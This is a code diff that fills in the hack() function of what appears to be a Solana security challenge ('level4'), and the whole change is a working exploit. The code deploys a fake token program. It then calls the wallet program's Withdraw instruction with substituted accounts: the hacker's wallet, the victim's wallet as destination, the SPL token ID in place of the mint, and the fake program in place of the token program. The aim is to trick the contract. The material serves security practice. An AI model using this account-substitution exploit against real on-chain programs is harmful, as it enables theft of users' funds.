@@ -9,6 +9,9 @@ use poc_framework::{
 
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+// need to pull these in
+use borsh::BorshSerialize;
+use solana_program::instruction::{AccountMeta, Instruction};
 
 struct Challenge {
     hacker: Keypair,
@@ -19,7 +22,45 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    assert_tx_success(env.execute_as_transaction(
+        &[level4::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+            challenge.mint,
+        )],
+        &[&challenge.hacker],
+    ));
+
+    let hacker_wallet_address = level4::get_wallet_address(
+        &challenge.hacker.pubkey(),
+        &challenge.wallet_program,
+    )
+    .0;
+    let authority_address = level4::get_authority(&challenge.wallet_program).0;
+    let fake_token_program =
+        env.deploy_program("target/deploy/level4_poc_contract.so");
+
+    env.execute_as_transaction(
+        &[Instruction {
+            program_id: challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet_address, false),             // usually: wallet_address
+                AccountMeta::new_readonly(authority_address, false),        // usually: authority_address
+                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // usually: owner_address
+                AccountMeta::new(challenge.wallet_address, false),          // usually: destination
+                AccountMeta::new_readonly(spl_token::ID, false),            // usually: expected mint
+                AccountMeta::new_readonly(fake_token_program, false),       // usually: spl_token program address
+            ],
+            data: level4::WalletInstruction::Withdraw { amount: 1337 }
+                .try_to_vec()
+                .unwrap(),
+        }],
+        &[&challenge.hacker],
+    )
+    .print_named("hax");
+}
+
 
 /*
 SETUP CODE BELOW
